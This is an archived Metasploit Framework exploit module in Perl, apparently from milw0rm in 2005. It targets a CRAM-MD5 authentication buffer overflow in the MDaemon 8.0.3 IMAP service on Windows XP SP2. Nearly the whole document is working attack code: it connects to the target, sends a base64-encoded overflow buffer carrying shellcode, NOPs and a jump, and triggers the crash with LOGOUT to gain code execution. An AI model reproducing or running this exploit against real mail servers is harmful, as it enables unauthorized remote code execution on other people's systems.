<html>
<head>
<title>Mdaemon 8.0.3 IMAPD CRAM-MD5 Authentication Overflow</title>
<pre>
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::mdaemon_imap_cram_md5;
use strict;
use base 'Msf::Exploit';
use Msf::Socket::Tcp;
use Pex::Text;

my $advanced = { };

my $info = {
	'Name'    =&gt; 'Mdaemon 8.0.3 IMAD CRAM-MD5 Authentication Overflow',
	'Version'  =&gt; '$Revision: 1.2 $',
	'Authors' =&gt; [ 'anonymous' ],

	'Arch'    =&gt; [ 'x86' ],
	'OS'      =&gt; [ 'win32'],
	'Priv'    =&gt; 1,

	'AutoOpts'  =&gt; { 'EXITFUNC'  =&gt; 'process' },
	'UserOpts'  =&gt;
	  {
		'RHOST' =&gt; [1, 'ADDR', 'The target address'],
		'RPORT' =&gt; [1, 'PORT', 'The target port', 143],
	  },

	'Payload' =&gt;
	  {
		'Prepend'	=&gt; &quot;\x81\xc4\x1f\xff\xff\xff\x44&quot;, # make stack happy
		'Space'     =&gt; 500,
		'BadChars'  =&gt; &quot;\x00&quot;,
	  },

	'Description'  =&gt; Pex::Text::Freeform(qq{
    This module exploits a buffer overflow in the CRAM-MD5 authentication of the
    MDaemon IMAP service. This vulnerability was discovered by Muts.
}),

	'Refs'  =&gt;
	  [
		['OSVDB', '11838'],
		['CVE',   '2004-1520'],
		['BID',   '11675'],
	  ],

	'Targets' =&gt;
	  [
		['MDaemon IMAP 8.0.3 Windows XP SP2'],
	  ],

	'Keys' =&gt; ['mdaemon'],
  };

sub new {
	my $class = shift;
	my $self = $class-&gt;SUPER::new({'Info' =&gt; $info, 'Advanced' =&gt; $advanced}, @_);

	return($self);
}

sub Exploit {
	my $self = shift;

	my $targetHost  = $self-&gt;GetVar('RHOST');
	my $targetPort  = $self-&gt;GetVar('RPORT');
	my $targetIndex = $self-&gt;GetVar('TARGET');
	my $encodedPayload = $self-&gt;GetVar('EncodedPayload');
	my $shellcode   = $encodedPayload-&gt;Payload;
	my $target = $self-&gt;Targets-&gt;[$targetIndex];

	if (! $self-&gt;InitNops(128)) {
		$self-&gt;PrintLine(&quot;[*] Failed to initialize the NOP module.&quot;);
		return;
	}

	my $sock = Msf::Socket::Tcp-&gt;new(
		'PeerAddr' =&gt; $targetHost,
		'PeerPort' =&gt; $targetPort,
	  );
	  
	if($sock-&gt;IsError) {
		$self-&gt;PrintLine('Error creating socket: ' . $sock-&gt;GetError);
		return;
	}

	my $resp = $sock-&gt;Recv(-1);
	chomp($resp);
	$self-&gt;PrintLine('[*] Got Banner: ' . $resp);

	my $req = &quot;a001 authenticate cram-md5\r\n&quot;;
	$sock-&gt;Send($req);
	$self-&gt;PrintLine('[*] CRAM-MD5 authentication method asked');

	$resp = $sock-&gt;Recv(-1);
	chomp($resp);
	$self-&gt;PrintLine('[*] Got CRAM-MD5 answer: ' . $resp);

	# Magic no return-address exploitation ninjaness!
	$req = &quot;AAAA&quot; . $shellcode . $self-&gt;MakeNops(258) . &quot;\xe9\x05\xfd\xff\xff&quot;;
	$req = Pex::Text::Base64Encode($req, '') . &quot;\r\n&quot;;
	$sock-&gt;Send($req);
	$self-&gt;PrintLine('[*] CRAM-MD5 authentication with shellcode sent');

	$resp = $sock-&gt;Recv(-1);
	chomp($resp);
	$self-&gt;PrintLine('[*] Got authentication reply: ' . $resp);

	$req = &quot;a002 LOGOUT\r\n&quot;;
	$sock-&gt;Send($req);
	$self-&gt;PrintLine('[*] Send LOGOUT to close the thread and trigger an exception');

	$resp = $sock-&gt;Recv(-1);
	chomp($resp);
	$self-&gt;PrintLine('[*] Got LOGOUT reply: ' . $resp);

	$self-&gt;PrintLine(&quot;[*] Overflow request sent, sleeping for one second&quot;);
	select(undef, undef, undef, 1);

	$self-&gt;Handler($sock);
	return;
}

1;

# milw0rm.com [2005-08-12]
</pre>
</html>

